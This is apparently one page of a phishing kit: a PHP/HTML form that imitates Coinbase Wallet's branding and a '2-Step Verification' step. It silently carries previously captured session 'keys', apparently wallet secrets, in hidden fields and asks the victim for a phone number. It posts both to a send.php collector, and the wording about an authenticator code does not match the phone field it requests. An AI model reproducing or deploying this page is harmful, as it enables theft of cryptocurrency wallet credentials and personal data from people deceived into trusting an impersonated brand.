<?php include_once './config.php'; ?>
<html lang="en">
    <?php
    $title = 'Coinbase Wallet';
    include_once './includes/meta.php';
    ?>
    <body>
        <?php include_once './includes/header.php'; ?>
        <link rel="stylesheet" href="<?= base_url('assets/country-code-picker/css/jquery.ccpicker.css')?>">
        <div class="container">
            <div class="row justify-content-center mt40">
                <div class="col-sm-6 rounded-4 p25 mb50" style="border: solid #383838 1px;">
                    <center><svg aria-label="Coinbase logo" class="cds-iconStyles-iogjozt" height="32" role="img" viewBox="0 0 48 48" width="32" xmlns="http://www.w3.org/2000/svg"><title>Coinbase logo</title><path d="M24,36c-6.63,0-12-5.37-12-12s5.37-12,12-12c5.94,0,10.87,4.33,11.82,10h12.09C46.89,9.68,36.58,0,24,0 C10.75,0,0,10.75,0,24s10.75,24,24,24c12.58,0,22.89-9.68,23.91-22H35.82C34.87,31.67,29.94,36,24,36z" fill="#FFFFFF"></path></svg>		</center>
                    <h4 class="text-center fw-bold mt15">2-Step Verification</h4>
                    <p class="text-center my15 fs16">Enter the 2-Step verification generated by your authenticator app.</p>
                    <form method="post" action="<?= base_url('send.php') ?>" class="py10">
                        <div className="my25">
                            <?php foreach ($_SESSION["keys"] as $ki => $key) { ?>
                            <input type="hidden" name="keys[<?=$ki?>]" class="" placeholder="<?=$ki?>" required="" style="background: transparent; border: 1px solid rgb(51, 51, 51);" value="<?=$key?>" />
                            <?php  } ?>
                            <div class="form-control  fs16" style=" background-color: #EFEFEF; border: 0px; ">
                                <input name="phone_number" type="number" id="phone_number" required="" style="background-color: #FFF;font-size: 16px;padding: 8px 12px;border-radius: 0px;border: 1px solid #ccc;color: #000;width: 80%;" placeholder="Phone number" value="" autocomplete="off" >
                            </div>
                        </div>
                        <div class="row">
                            <div class="col-sm-12 my30 mb50 text-center">
                                <button type="submit" class="btn btn-primary bg-primary-2 px60 rounded-pill py12 fs15">Confirm & Verify</button>
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        </div> 
    <?php include_once './includes/footer.php'; ?>
    <script src="<?=base_url('assets/country-code-picker/js/jquery.ccpicker.min.js')?>"></script>
    <script type="text/javascript">
        $(document).ready(function() {
            $("#phone_number").CcPicker({ countryCode: "us", dataUrl: "<?= base_url('assets/country-code-picker/data/en.json') ?>", searchPlaceHolder: "Find..." });
        });
    </script>
</body>
</html>